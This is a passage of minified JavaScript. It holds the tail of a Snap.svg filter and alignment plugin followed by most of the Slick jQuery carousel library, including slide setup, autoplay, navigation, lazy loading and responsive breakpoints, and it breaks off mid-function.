intercept="{amount2}"/><feFuncG type="linear" slope="{amount}" intercept="{amount2}"/><feFuncB type="linear" slope="{amount}" intercept="{amount2}"/></feComponentTransfer>',{amount:e,amount2:.5-e/2})},t.filter.contrast.toString=function(){return this()}})),n.plugin((function(t,e){var i=t._.box,n=t.is,o=/^[^a-z]*([tbmlrc])/i,r=function(){return"T"+this.dx+","+this.dy};e.prototype.getAlign=function(t,e){null==e&&n(t,"string")&&(e=t,t=null);var s=(t=t||this.paper).getBBox?t.getBBox():i(t),a=this.getBBox(),l={};switch(e=(e=e&&e.match(o))?e[1].toLowerCase():"c"){case"t":l.dx=0,l.dy=s.y-a.y;break;case"b":l.dx=0,l.dy=s.y2-a.y2;break;case"m":l.dx=0,l.dy=s.cy-a.cy;break;case"l":l.dx=s.x-a.x,l.dy=0;break;case"r":l.dx=s.x2-a.x2,l.dy=0;break;default:l.dx=s.cx-a.cx,l.dy=0}return l.toString=r,l},e.prototype.align=function(t,e){return this.transform("..."+this.getAlign(t,e))}})),n})),function(t){"use strict";"function"==typeof define&&define.amd?define(["jquery"],t):"undefined"!=typeof exports?module.exports=t(require("jquery")):t(jQuery)}((function(t){"use strict";var e=window.Slick||{};(e=function(){var e=0;return function(i,n){var o,r=this;r.defaults={accessibility:!0,adaptiveHeight:!1,appendArrows:t(i),appendDots:t(i),arrows:!0,asNavFor:null,prevArrow:'<button type="button" data-role="none" class="slick-prev" aria-label="Previous" tabindex="0" role="button">Previous</button>',nextArrow:'<button type="button" data-role="none" class="slick-next" aria-label="Next" tabindex="0" role="button">Next</button>',autoplay:!1,autoplaySpeed:3e3,centerMode:!1,centerPadding:"50px",cssEase:"ease",customPaging:function(t,e){return'<button type="button" data-role="none" role="button" aria-required="false" tabindex="0">'+(e+1)+"</button>"},dots:!1,dotsClass:"slick-dots",draggable:!0,easing:"linear",edgeFriction:.35,fade:!1,focusOnSelect:!1,infinite:!0,initialSlide:0,lazyLoad:"ondemand",mobileFirst:!1,pauseOnHover:!0,pauseOnDotsHover:!1,respondTo:"window",responsive:null,rows:1,rtl:!1,slide:"",slidesPerRow:1,slidesToShow:1,slidesToScroll:1,speed:500,swipe:!0,swipeToSlide:!1,touchMove:!0,touchThreshold:5,useCSS:!0,variableWidth:!1,vertical:!1,verticalSwiping:!1,waitForAnimate:!0,zIndex:1e3},r.initials={animating:!1,dragging:!1,autoPlayTimer:null,currentDirection:0,currentLeft:null,currentSlide:0,direction:1,$dots:null,listWidth:null,listHeight:null,loadIndex:0,$nextArrow:null,$prevArrow:null,slideCount:null,slideWidth:null,$slideTrack:null,$slides:null,sliding:!1,slideOffset:0,swipeLeft:null,$list:null,touchObject:{},transformsEnabled:!1,unslicked:!1},t.extend(r,r.initials),r.activeBreakpoint=null,r.animType=null,r.animProp=null,r.breakpoints=[],r.breakpointSettings=[],r.cssTransitions=!1,r.hidden="hidden",r.paused=!1,r.positionProp=null,r.respondTo=null,r.rowCount=1,r.shouldClick=!0,r.$slider=t(i),r.$slidesCache=null,r.transformType=null,r.transitionType=null,r.visibilityChange="visibilitychange",r.windowWidth=0,r.windowTimer=null,o=t(i).data("slick")||{},r.options=t.extend({},r.defaults,o,n),r.currentSlide=r.options.initialSlide,r.originalSettings=r.options,void 0!==document.mozHidden?(r.hidden="mozHidden",r.visibilityChange="mozvisibilitychange"):void 0!==document.webkitHidden&&(r.hidden="webkitHidden",r.visibilityChange="webkitvisibilitychange"),r.autoPlay=t.proxy(r.autoPlay,r),r.autoPlayClear=t.proxy(r.autoPlayClear,r),r.changeSlide=t.proxy(r.changeSlide,r),r.clickHandler=t.proxy(r.clickHandler,r),r.selectHandler=t.proxy(r.selectHandler,r),r.setPosition=t.proxy(r.setPosition,r),r.swipeHandler=t.proxy(r.swipeHandler,r),r.dragHandler=t.proxy(r.dragHandler,r),r.keyHandler=t.proxy(r.keyHandler,r),r.autoPlayIterator=t.proxy(r.autoPlayIterator,r),r.instanceUid=e++,r.htmlExpr=/^(?:\s*(<[\w\W]+>)[^>]*)$/,r.registerBreakpoints(),r.init(!0),r.checkResponsive(!0)}}()).prototype.addSlide=e.prototype.slickAdd=function(e,i,n){var o=this;if("boolean"==typeof i)n=i,i=null;else if(i<0||i>=o.slideCount)return!1;o.unload(),"number"==typeof i?0===i&&0===o.$slides.length?t(e).appendTo(o.$slideTrack):n?t(e).insertBefore(o.$slides.eq(i)):t(e).insertAfter(o.$slides.eq(i)):!0===n?t(e).prependTo(o.$slideTrack):t(e).appendTo(o.$slideTrack),o.$slides=o.$slideTrack.children(this.options.slide),o.$slideTrack.children(this.options.slide).detach(),o.$slideTrack.append(o.$slides),o.$slides.each((function(e,i){t(i).attr("data-slick-index",e)})),o.$slidesCache=o.$slides,o.reinit()},e.prototype.animateHeight=function(){var t=this;if(1===t.options.slidesToShow&&!0===t.options.adaptiveHeight&&!1===t.options.vertical){var e=t.$slides.eq(t.currentSlide).outerHeight(!0);t.$list.animate({height:e},t.options.speed)}},e.prototype.animateSlide=function(e,i){var n={},o=this;o.animateHeight(),!0===o.options.rtl&&!1===o.options.vertical&&(e=-e),!1===o.transformsEnabled?!1===o.options.vertical?o.$slideTrack.animate({left:e},o.options.speed,o.options.easing,i):o.$slideTrack.animate({top:e},o.options.speed,o.options.easing,i):!1===o.cssTransitions?(!0===o.options.rtl&&(o.currentLeft=-o.currentLeft),t({animStart:o.currentLeft}).animate({animStart:e},{duration:o.options.speed,easing:o.options.easing,step:function(t){t=Math.ceil(t),!1===o.options.vertical?(n[o.animType]="translate("+t+"px, 0px)",o.$slideTrack.css(n)):(n[o.animType]="translate(0px,"+t+"px)",o.$slideTrack.css(n))},complete:function(){i&&i.call()}})):(o.applyTransition(),e=Math.ceil(e),!1===o.options.vertical?n[o.animType]="translate3d("+e+"px, 0px, 0px)":n[o.animType]="translate3d(0px,"+e+"px, 0px)",o.$slideTrack.css(n),i&&setTimeout((function(){o.disableTransition(),i.call()}),o.options.speed))},e.prototype.asNavFor=function(e){var i=this.options.asNavFor;i&&null!==i&&(i=t(i).not(this.$slider)),null!==i&&"object"==typeof i&&i.each((function(){var i=t(this).slick("getSlick");i.unslicked||i.slideHandler(e,!0)}))},e.prototype.applyTransition=function(t){var e=this,i={};!1===e.options.fade?i[e.transitionType]=e.transformType+" "+e.options.speed+"ms "+e.options.cssEase:i[e.transitionType]="opacity "+e.options.speed+"ms "+e.options.cssEase,!1===e.options.fade?e.$slideTrack.css(i):e.$slides.eq(t).css(i)},e.prototype.autoPlay=function(){var t=this;t.autoPlayTimer&&clearInterval(t.autoPlayTimer),t.slideCount>t.options.slidesToShow&&!0!==t.paused&&(t.autoPlayTimer=setInterval(t.autoPlayIterator,t.options.autoplaySpeed))},e.prototype.autoPlayClear=function(){this.autoPlayTimer&&clearInterval(this.autoPlayTimer)},e.prototype.autoPlayIterator=function(){var t=this;!1===t.options.infinite?1===t.direction?(t.currentSlide+1===t.slideCount-1&&(t.direction=0),t.slideHandler(t.currentSlide+t.options.slidesToScroll)):(t.currentSlide-1==0&&(t.direction=1),t.slideHandler(t.currentSlide-t.options.slidesToScroll)):t.slideHandler(t.currentSlide+t.options.slidesToScroll)},e.prototype.buildArrows=function(){var t=this;!0===t.options.arrows&&(t.$prevArrow=t.options.prevArrow,t.$nextArrow=t.options.nextArrow,t.$prevArrow.addClass("slick-arrow"),t.$nextArrow.addClass("slick-arrow"),t.slideCount>t.options.slidesToShow?(t.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),t.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),t.htmlExpr.test(t.options.prevArrow)&&!t.options.prevArrow instanceof jQuery&&t.$prevArrow.prependTo(t.options.appendArrows),t.htmlExpr.test(t.options.nextArrow)&&!t.options.nextArrow instanceof jQuery&&t.$nextArrow.appendTo(t.options.appendArrows),!0!==t.options.infinite&&t.$prevArrow.addClass("slick-disabled").attr("aria-disabled","true")):t.$prevArrow.add(t.$nextArrow).addClass("slick-hidden").attr({"aria-disabled":"true",tabindex:"-1"}))},e.prototype.buildDots=function(){var e,i,n=this;if(!0===n.options.dots&&n.slideCount>n.options.slidesToShow){for(i='<ul class="'+n.options.dotsClass+'">',e=0;e<=n.getDotCount();e+=1)i+="<li>"+n.options.customPaging.call(this,n,e)+"</li>";i+="</ul>",n.$dots=t(i).appendTo(n.options.appendDots),n.$dots.find("li").first().addClass("slick-active").attr("aria-hidden","false")}},e.prototype.buildOut=function(){var e=this;e.$slides=e.$slider.children(e.options.slide+":not(.slick-cloned)").addClass("slick-slide"),e.slideCount=e.$slides.length,e.$slides.each((function(e,i){t(i).attr("data-slick-index",e).data("originalStyling",t(i).attr("style")||"")})),e.$slidesCache=e.$slides,e.$slider.addClass("slick-slider"),e.$slideTrack=0===e.slideCount?t('<div class="slick-track"/>').appendTo(e.$slider):e.$slides.wrapAll('<div class="slick-track"/>').parent(),e.$list=e.$slideTrack.wrap('<div aria-live="polite" class="slick-list"/>').parent(),e.$slideTrack.css("opacity",0),!0!==e.options.centerMode&&!0!==e.options.swipeToSlide||(e.options.slidesToScroll=1),t("img[data-lazy]",e.$slider).not("[src]").addClass("slick-loading"),e.setupInfinite(),e.buildArrows(),e.buildDots(),e.updateDots(),e.setSlideClasses("number"==typeof e.currentSlide?e.currentSlide:0),!0===e.options.draggable&&e.$list.addClass("draggable")},e.prototype.buildRows=function(){var t,e,i,n,o,r,s,a=this;if(n=document.createDocumentFragment(),r=a.$slider.children(),a.options.rows>1){for(s=a.options.slidesPerRow*a.options.rows,o=Math.ceil(r.length/s),t=0;t<o;t++){var l=document.createElement("div");for(e=0;e<a.options.rows;e++){var d=document.createElement("div");for(i=0;i<a.options.slidesPerRow;i++){var c=t*s+(e*a.options.slidesPerRow+i);r.get(c)&&d.appendChild(r.get(c))}l.appendChild(d)}n.appendChild(l)}a.$slider.html(n),a.$slider.children().children().children().css({width:100/a.options.slidesPerRow+"%",display:"inline-block"})}},e.prototype.checkResponsive=function(e,i){var n,o,r,s=this,a=!1,l=s.$slider.width(),d=window.innerWidth||t(window).width();if("window"===s.respondTo?r=d:"slider"===s.respondTo?r=l:"min"===s.respondTo&&(r=Math.min(d,l)),s.options.responsive&&s.options.responsive.length&&null!==s.options.responsive){for(n in o=null,s.breakpoints)s.breakpoints.hasOwnProperty(n)&&(!1===s.originalSettings.mobileFirst?r<s.breakpoints[n]&&(o=s.breakpoints[n]):r>s.breakpoints[n]&&(o=s.breakpoints[n]));null!==o?null!==s.activeBreakpoint?(o!==s.activeBreakpoint||i)&&(s.activeBreakpoint=o,"unslick"===s.breakpointSettings[o]?s.unslick(o):(s.options=t.extend({},s.originalSettings,s.breakpointSettings[o]),!0===e&&(s.currentSlide=s.options.initialSlide),s.refresh(e)),a=o):(s.activeBreakpoint=o,"unslick"===s.breakpointSettings[o]?s.unslick(o):(s.options=t.extend({},s.originalSettings,s.breakpointSettings[o]),!0===e&&(s.currentSlide=s.options.initialSlide),s.refresh(e)),a=o):null!==s.activeBreakpoint&&(s.activeBreakpoint=null,s.options=s.originalSettings,!0===e&&(s.currentSlide=s.options.initialSlide),s.refresh(e),a=o),e||!1===a||s.$slider.trigger("breakpoint",[s,a])}},e.prototype.changeSlide=function(e,i){var n,o,r=this,s=t(e.target);switch(s.is("a")&&e.preventDefault(),s.is("li")||(s=s.closest("li")),n=r.slideCount%r.options.slidesToScroll!=0?0:(r.slideCount-r.currentSlide)%r.options.slidesToScroll,e.data.message){case"previous":o=0===n?r.options.slidesToScroll:r.options.slidesToShow-n,r.slideCount>r.options.slidesToShow&&r.slideHandler(r.currentSlide-o,!1,i);break;case"next":o=0===n?r.options.slidesToScroll:n,r.slideCount>r.options.slidesToShow&&r.slideHandler(r.currentSlide+o,!1,i);break;case"index":var a=0===e.data.index?0:e.data.index||s.index()*r.options.slidesToScroll;r.slideHandler(r.checkNavigable(a),!1,i),s.children().trigger("focus");break;default:return}},e.prototype.checkNavigable=function(t){var e,i;if(i=0,t>(e=this.getNavigableIndexes())[e.length-1])t=e[e.length-1];else for(var n in e){if(t<e[n]){t=i;break}i=e[n]}return t},e.prototype.cleanUpEvents=function(){var e=this;e.options.dots&&null!==e.$dots&&(t("li",e.$dots).off("click.slick",e.changeSlide),!0===e.options.pauseOnDotsHover&&!0===e.options.autoplay&&t("li",e.$dots).off("mouseenter.slick",t.proxy(e.setPaused,e,!0)).off("mouseleave.slick",t.proxy(e.setPaused,e,!1))),!0===e.options.arrows&&e.slideCount>e.options.slidesToShow&&(e.$prevArrow&&e.$prevArrow.off("click.slick",e.changeSlide),e.$nextArrow&&e.$nextArrow.off("click.slick",e.changeSlide)),e.$list.off("touchstart.slick mousedown.slick",e.swipeHandler),e.$list.off("touchmove.slick mousemove.slick",e.swipeHandler),e.$list.off("touchend.slick mouseup.slick",e.swipeHandler),e.$list.off("touchcancel.slick mouseleave.slick",e.swipeHandler),e.$list.off("click.slick",e.clickHandler),t(document).off(e.visibilityChange,e.visibility),e.$list.off("mouseenter.slick",t.proxy(e.setPaused,e,!0)),e.$list.off("mouseleave.slick",t.proxy(e.setPaused,e,!1)),!0===e.options.accessibility&&e.$list.off("keydown.slick",e.keyHandler),!0===e.options.focusOnSelect&&t(e.$slideTrack).children().off("click.slick",e.selectHandler),t(window).off("orientationchange.slick.slick-"+e.instanceUid,e.orientationChange),t(window).off("resize.slick.slick-"+e.instanceUid,e.resize),t("[draggable!=true]",e.$slideTrack).off("dragstart",e.preventDefault),t(window).off("load.slick.slick-"+e.instanceUid,e.setPosition),t(document).off("ready.slick.slick-"+e.instanceUid,e.setPosition)},e.prototype.cleanUpRows=function(){var t,e=this;e.options.rows>1&&((t=e.$slides.children().children()).removeAttr("style"),e.$slider.html(t))},e.prototype.clickHandler=function(t){!1===this.shouldClick&&(t.stopImmediatePropagation(),t.stopPropagation(),t.preventDefault())},e.prototype.destroy=function(e){var i=this;i.autoPlayClear(),i.touchObject={},i.cleanUpEvents(),t(".slick-cloned",i.$slider).detach(),i.$dots&&i.$dots.remove(),i.$prevArrow.length&&(i.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display",""),i.htmlExpr.test(i.options.prevArrow)&&i.$prevArrow.remove()),i.$nextArrow.length&&(i.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display",""),i.htmlExpr.test(i.options.nextArrow)&&i.$nextArrow.remove()),i.$slides&&(i.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each((function(){t(this).attr("style",t(this).data("originalStyling"))})),i.$slideTrack.children(this.options.slide).detach(),i.$slideTrack.detach(),i.$list.detach(),i.$slider.append(i.$slides)),i.cleanUpRows(),i.$slider.removeClass("slick-slider"),i.$slider.removeClass("slick-initialized"),i.unslicked=!0,e||i.$slider.trigger("destroy",[i])},e.prototype.disableTransition=function(t){var e=this,i={};i[e.transitionType]="",!1===e.options.fade?e.$slideTrack.css(i):e.$slides.eq(t).css(i)},e.prototype.fadeSlide=function(t,e){var i=this;!1===i.cssTransitions?(i.$slides.eq(t).css({zIndex:i.options.zIndex}),i.$slides.eq(t).animate({opacity:1},i.options.speed,i.options.easing,e)):(i.applyTransition(t),i.$slides.eq(t).css({opacity:1,zIndex:i.options.zIndex}),e&&setTimeout((function(){i.disableTransition(t),e.call()}),i.options.speed))},e.prototype.fadeSlideOut=function(t){var e=this;!1===e.cssTransitions?e.$slides.eq(t).animate({opacity:0,zIndex:e.options.zIndex-2},e.options.speed,e.options.easing):(e.applyTransition(t),e.$slides.eq(t).css({opacity:0,zIndex:e.options.zIndex-2}))},e.prototype.filterSlides=e.prototype.slickFilter=function(t){var e=this;null!==t&&(e.unload(),e.$slideTrack.children(this.options.slide).detach(),e.$slidesCache.filter(t).appendTo(e.$slideTrack),e.reinit())},e.prototype.getCurrent=e.prototype.slickCurrentSlide=function(){return this.currentSlide},e.prototype.getDotCount=function(){var t=this,e=0,i=0,n=0;if(!0===t.options.infinite)for(;e<t.slideCount;)++n,e=i+t.options.slidesToShow,i+=t.options.slidesToScroll<=t.options.slidesToShow?t.options.slidesToScroll:t.options.slidesToShow;else if(!0===t.options.centerMode)n=t.slideCount;else for(;e<t.slideCount;)++n,e=i+t.options.slidesToShow,i+=t.options.slidesToScroll<=t.options.slidesToShow?t.options.slidesToScroll:t.options.slidesToShow;return n-1},e.prototype.getLeft=function(t){var e,i,n,o=this,r=0;return o.slideOffset=0,i=o.$slides.first().outerHeight(!0),!0===o.options.infinite?(o.slideCount>o.options.slidesToShow&&(o.slideOffset=o.slideWidth*o.options.slidesToShow*-1,r=i*o.options.slidesToShow*-1),o.slideCount%o.options.slidesToScroll!=0&&t+o.options.slidesToScroll>o.slideCount&&o.slideCount>o.options.slidesToShow&&(t>o.slideCount?(o.slideOffset=(o.options.slidesToShow-(t-o.slideCount))*o.slideWidth*-1,r=(o.options.slidesToShow-(t-o.slideCount))*i*-1):(o.slideOffset=o.slideCount%o.options.slidesToScroll*o.slideWidth*-1,r=o.slideCount%o.options.slidesToScroll*i*-1))):t+o.options.slidesToShow>o.slideCount&&(o.slideOffset=(t+o.options.slidesToShow-o.slideCount)*o.slideWidth,r=(t+o.options.slidesToShow-o.slideCount)*i),o.slideCount<=o.options.slidesToShow&&(o.slideOffset=0,r=0),!0===o.options.centerMode&&!0===o.options.infinite?o.slideOffset+=o.slideWidth*Math.floor(o.options.slidesToShow/2)-o.slideWidth:!0===o.options.centerMode&&(o.slideOffset=0,o.slideOffset+=o.slideWidth*Math.floor(o.options.slidesToShow/2)),e=!1===o.options.vertical?t*o.slideWidth*-1+o.slideOffset:t*i*-1+r,!0===o.options.variableWidth&&(e=(n=o.slideCount<=o.options.slidesToShow||!1===o.options.infinite?o.$slideTrack.children(".slick-slide").eq(t):o.$slideTrack.children(".slick-slide").eq(t+o.options.slidesToShow))[0]?-1*n[0].offsetLeft:0,!0===o.options.centerMode&&(e=(n=!1===o.options.infinite?o.$slideTrack.children(".slick-slide").eq(t):o.$slideTrack.children(".slick-slide").eq(t+o.options.slidesToShow+1))[0]?-1*n[0].offsetLeft:0,e+=(o.$list.width()-n.outerWidth())/2)),e},e.prototype.getOption=e.prototype.slickGetOption=function(t){return this.options[t]},e.prototype.getNavigableIndexes=function(){var t,e=this,i=0,n=0,o=[];for(!1===e.options.infinite?t=e.slideCount:(i=-1*e.options.slidesToScroll,n=-1*e.options.slidesToScroll,t=2*e.slideCount);i<t;)o.push(i),i=n+e.options.slidesToScroll,n+=e.options.slidesToScroll<=e.options.slidesToShow?e.options.slidesToScroll:e.options.slidesToShow;return o},e.prototype.getSlick=function(){return this},e.prototype.getSlideCount=function(){var e,i,n=this;return i=!0===n.options.centerMode?n.slideWidth*Math.floor(n.options.slidesToShow/2):0,!0===n.options.swipeToSlide?(n.$slideTrack.find(".slick-slide").each((function(o,r){if(r.offsetLeft-i+t(r).outerWidth()/2>-1*n.swipeLeft)return e=r,!1})),Math.abs(t(e).attr("data-slick-index")-n.currentSlide)||1):n.options.slidesToScroll},e.prototype.goTo=e.prototype.slickGoTo=function(t,e){this.changeSlide({data:{message:"index",index:parseInt(t)}},e)},e.prototype.init=function(e){var i=this;t(i.$slider).hasClass("slick-initialized")||(t(i.$slider).addClass("slick-initialized"),i.buildRows(),i.buildOut(),i.setProps(),i.startLoad(),i.loadSlider(),i.initializeEvents(),i.updateArrows(),i.updateDots()),e&&i.$slider.trigger("init",[i]),!0===i.options.accessibility&&i.initADA()},e.prototype.initArrowEvents=function(){var t=this;!0===t.options.arrows&&t.slideCount>t.options.slidesToShow&&(t.$prevArrow.on("click.slick",{message:"previous"},t.changeSlide),t.$nextArrow.on("click.slick",{message:"next"},t.changeSlide))},e.prototype.initDotEvents=function(){var e=this;!0===e.options.dots&&e.slideCount>e.options.slidesToShow&&t("li",e.$dots).on("click.slick",{message:"index"},e.changeSlide),!0===e.options.dots&&!0===e.options.pauseOnDotsHover&&!0===e.options.autoplay&&t("li",e.$dots).on("mouseenter.slick",t.proxy(e.setPaused,e,!0)).on("mouseleave.slick",t.proxy(e.setPaused,e,!1))},e.prototype.initializeEvents=function(){var e=this;e.initArrowEvents(),e.initDotEvents(),e.$list.on("touchstart.slick mousedown.slick",{action:"start"},e.swipeHandler),e.$list.on("touchmove.slick mousemove.slick",{action:"move"},e.swipeHandler),e.$list.on("touchend.slick mouseup.slick",{action:"end"},e.swipeHandler),e.$list.on("touchcancel.slick mouseleave.slick",{action:"end"},e.swipeHandler),e.$list.on("click.slick",e.clickHandler),t(document).on(e.visibilityChange,t.proxy(e.visibility,e)),e.$list.on("mouseenter.slick",t.proxy(e.setPaused,e,!0)),e.$list.on("mouseleave.slick",t.proxy(e.setPaused,e,!1)),!0===e.options.accessibility&&e.$list.on("keydown.slick",e.keyHandler),!0===e.options.focusOnSelect&&t(e.$slideTrack).children().on("click.slick",e.selectHandler),t(window).on("orientationchange.slick.slick-"+e.instanceUid,t.proxy(e.orientationChange,e)),t(window).on("resize.slick.slick-"+e.instanceUid,t.proxy(e.resize,e)),t("[draggable!=true]",e.$slideTrack).on("dragstart",e.preventDefault),t(window).on("load.slick.slick-"+e.instanceUid,e.setPosition),t(document).on("ready.slick.slick-"+e.instanceUid,e.setPosition)},e.prototype.initUI=function(){var t=this;!0===t.options.arrows&&t.slideCount>t.options.slidesToShow&&(t.$prevArrow.show(),t.$nextArrow.show()),!0===t.options.dots&&t.slideCount>t.options.slidesToShow&&t.$dots.show(),!0===t.options.autoplay&&t.autoPlay()},e.prototype.keyHandler=function(t){var e=this;t.target.tagName.match("TEXTAREA|INPUT|SELECT")||(37===t.keyCode&&!0===e.options.accessibility?e.changeSlide({data:{message:"previous"}}):39===t.keyCode&&!0===e.options.accessibility&&e.changeSlide({data:{message:"next"}}))},e.prototype.lazyLoad=function(){var e,i,n=this;function o(e){t("img[data-lazy]",e).each((function(){var e=t(this),i=t(this).attr("data-lazy"),n=document.createElement("img");n.onload=function(){e.animate({opacity:0},100,(function(){e.attr("src",i).animate({opacity:1},200,(function(){e.removeAttr("data-lazy").removeClass("slick-loading")}))}))},n.src=i}))}!0===n.options.centerMode?!0===n.options.infinite?i=(e=n.currentSlide+(n.options.slidesToShow/2+1))+n.options.slidesToShow+2:(e=Math.max(0,n.currentSlide-(n.options.slidesToShow/2+1)),i=n.options.slidesToShow/2+1+2+n.currentSlide):(i=(e=n.options.infinite?n.options.slidesToShow+n.currentSlide:n.currentSlide)+n.options.slidesToShow,!0===n.options.fade&&(e>0&&e--,i<=n.slideCount&&i++)),o(n.$slider.find(".slick-slide").slice(e,i)),n.slideCount<=n.options.slidesToShow?o(n.$slider.find(".slick-slide")):n.currentSlide>=n.slideCount-n.options.slidesToShow?o(n.$slider.find(".slick-cloned").slice(0,n.options.slidesToShow)):0===n.currentSlide&&o(n.$slider.find(".slick-cloned").slice(-1*n.options.slidesToShow))},e.prototype.loadSlider=function(){var t=this;t.setPosition(),t.$slideTrack.css({opacity:1}),t.$slider.removeClass("slick-loading"),t.initUI(),"progressive"===t.options.lazyLoad&&t.progressiveLazyLoad()},e.prototype.next=e.prototype.slickNext=function(){this.changeSlide({data:{message:"next"}})},e.prototype.orientationChange=function(){this.checkResponsive(),this.setPosition()},e.prototype.pause=e.prototype.slickPause=function(){this.autoPlayClear(),this.paused=!0},e.prototype.play=e.prototype.slickPlay=function(){this.paused=!1,this.autoPlay()},e.prototype.postSlide=function(t){var e=this;e.$slider.trigger("afterChange",[e,t]),e.animating=!1,e.setPosition(),e.swipeLeft=null,!0===e.options.autoplay&&!1===e.paused&&e.autoPlay(),!0===e.options.accessibility&&e.initADA()},e.prototype.prev=e.prototype.slickPrev=function(){this.changeSlide({data:{message:"previous"}})},e.prototype.preventDefault=function(t){t.preventDefault()},e.prototype.progressiveLazyLoad=function(){var e,i=this;t("img[data-lazy]",i.$slider).length>0&&(e=t("img[data-lazy]",i.$slider).first()).attr("src",e.attr("data-lazy")).removeClass("slick-loading").load((function(){e.removeAttr("data-lazy"),i.progressiveLazyLoad(),!0===i.options.adaptiveHeight&&i.setPosition()})).error((function(){e.removeAttr("data-lazy"),i.progressiveLazyLoad()}))},e.prototype.refresh=function(e){var i=this,n=i.currentSlide;i.destroy(!0),t.extend(i,i.initials,{currentSlide:n}),i.init(),e||i.changeSlide({data:{message:"index",index:n}},!1)},e.prototype.registerBreakpoints=function(){var e,i,n,o=this,r=o.options.responsive||null;if("array"===t.type(r)&&r.length){for(e in o.respondTo=o.options.respondTo||"window",r)if(n=o.breakpoints.length-1,i=r[e].breakpoint,r.hasOwnProperty(e)){for(;n>=0;)o.breakpoints[n]&&o.breakpoints[n]===i&&o.breakpoints.splice(n,1),n--;o.breakpoints.push(i),o.breakpointSettings[i]=r[e].settings}o.breakpoints.sort((function(t,e){return o.options.mobileFirst?t-e:e-t}))}},e.prototype.reinit=function(){var e=this;e.$slides=e.$slideTrack.children(e.options.slide).addClass("slick-slide"),e.slideCount=e.$slides.length,e.currentSlide>=e.slideCount&&0!==e.currentSlide&&(e.currentSlide=e.currentSlide-e.options.slidesToScroll),e.slideCount<=e.options.slidesToShow&&(e.currentSlide=0),e.registerBreakpoints(),e.setProps(),e.setupInfinite(),e.buildArrows(),e.updateArrows(),e.initArrowEvents(),e.buildDots(),e.updateDots(),e.initDotEvents(),e.checkResponsive(!1,!0),!0===e.options.focusOnSelect&&t(e.$slideTrack).children().on("click.slick",e.selectHandler),e.setSlideClasses(0),e.setPosition(),e.$slider.trigger("reInit",[e]),!0===e.options.autoplay&&e.focusHandler()},e.prototype.resize=function(){var e=this;t(window).width()!==e.windowWidth&&(clearTimeout(e.windowDelay),e.windowDelay=window.setTimeout((function(){e.windowWidth=t(window).width(),e.checkResponsive(),e.unslicked||e.setPosition()}),50))},e.prototype.removeSlide=e.prototype.slickRemove=function(t,e,i){var n=this;if(t="boolean"==typeof t?!0===(e=t)?0:n.slideCount-1:!0===e?--t:t,n.slideCount<1||t<0||t>n.slideCount-1)return!1;n.unload(),!0===i?n.$slideTrack.children().remove():n.$slideTrack.children(this.options.slide).eq(t).remove(),n.$slides=n.$slideTrack.children(this.options.slide),n.$slideTrack.children(this.options.slide).detach(),n.$slideTrack.append(n.$slides),n.$slidesCache=n.$slides,n.reinit()},e.prototype.setCSS=function(t){var e,i,n=this,o={};!0===n.options.rtl&&(t=-t),e="left"==n.positionProp?Math.ceil(t)+"px":"0px",i="top"==n.positionProp?Math.ceil(t)+"px":"0px",o[n.positionProp]=t,!1===n.transformsEnabled?n.$slideTrack.css(o):(o={},!1===n.cssTransitions?(o[n.animType]="translate("+e+", "+i+")",n.$slideTrack.css(o)):(o[n.animType]="translate3d("+e+", "+i+", 0px)",n.$slideTrack.css(o)))},e.prototype.setDimensions=function(){var t=this;!1===t.options.vertical?!0===t.options.centerMode&&t.$list.css({padding:"0px "+t.options.centerPadding}):(t.$list.height(t.$slides.first().outerHeight(!0)*t.options.slidesToShow),!0===t.options.centerMode&&t.$list.css({padding:t.options.centerPadding+" 0px"})),t.listWidth=t.$list.width(),t.listHeight=t.$list.height(),!1===t.options.vertical&&!1===t.options.variableWidth?(t.slideWidth=Math.ceil(t.listWidth/t.options.slidesToShow),t.$slideTrack.width(Math.ceil(t.slideWidth*t.$slideTrack.children(".slick-slide").length))):!0===t.options.variableWidth?t.$slideTrack.width(5e3*t.slideCount):(t.slideWidth=Math.ceil(t.listWidth),t.$slideTrack.height(Math.ceil(t.$slides.first().outerHeight(!0)*t.$slideTrack.children(".slick-slide").length)));var e=t.$slides.first().outerWidth(!0)-t.$slides.first().width();!1===t.options.variableWidth&&t.$slideTrack.children(".slick-slide").width(t.slideWidth-e)},e.prototype.setFade=function(){var e,i=this;i.$slides.each((function(n,o){e=i.slideWidth*n*-1,!0===i.options.rtl?t(o).css({position:"relative",right:e,top:0,zIndex:i.options.zIndex-2,opacity:0}):t(o).css({position:"relative",left:e,top:0,zIndex:i.options.zIndex-2,opacity:0})})),i.$slides.eq(i.currentSlide).css({zIndex:i.options.zIndex-1,opacity:1})},e.prototype.setHeight=function(){var t=this;if(1===t.options.slidesToShow&&!0===t.options.adaptiveHeight&&!1===t.options.vertical){var e=t.$slides.eq(t.currentSlide).outerHeight(!0);t.$list.css("height",e)}},e.prototype.setOption=e.prototype.slickSetOption=function(e,i,n){var o,r,s=this;if("responsive"===e&&"array"===t.type(i))for(r in i)if("array"!==t.type(s.options.responsive))s.options.responsive=[i[r]];else{for(o=s.options.responsive.length-1;o>=0;)s.options.responsive[o].breakpoint===i[r].breakpoint&&s.options.responsive.splice(o,1),o--;s.options.responsive.push(i[r])}else s.options[e]=i;!0===n&&(s.unload(),s.reinit())},e.prototype.setPosition=function(){var t=this;t.setDimensions(),t.setHeight(),!1===t.options.fade?t.setCSS(t.getLeft(t.currentSlide)):t.setFade(),t.$slider.trigger("setPosition",[t])},e.prototype.setProps=function(){var t=this,e=document.body.style;t.positionProp=!0===t.options.vertical?"top":"left","top"===t.positionProp?t.$slider.addClass("slick-vertical"):t.$slider.removeClass("slick-vertical"),void 0===e.WebkitTransition&&void 0===e.MozTransition&&void 0===e.msTransition||!0===t.options.useCSS&&(t.cssTransitions=!0),t.options.fade&&("number"==typeof t.options.zIndex?t.options.zIndex<3&&(t.options.zIndex=3):t.options.zIndex=t.defaults.zIndex),void 0!==e.OTransform&&(t.animType="OTransform",t.transformType="-o-transform",t.transitionType="OTransition",void 0===e.perspectiveProperty&&void 0===e.webkitPerspective&&(t.animType=!1)),void 0!==e.MozTransform&&(t.animType="MozTransform",t.transformType="-moz-transform",t.transitionType="MozTransition",void 0===e.perspectiveProperty&&void 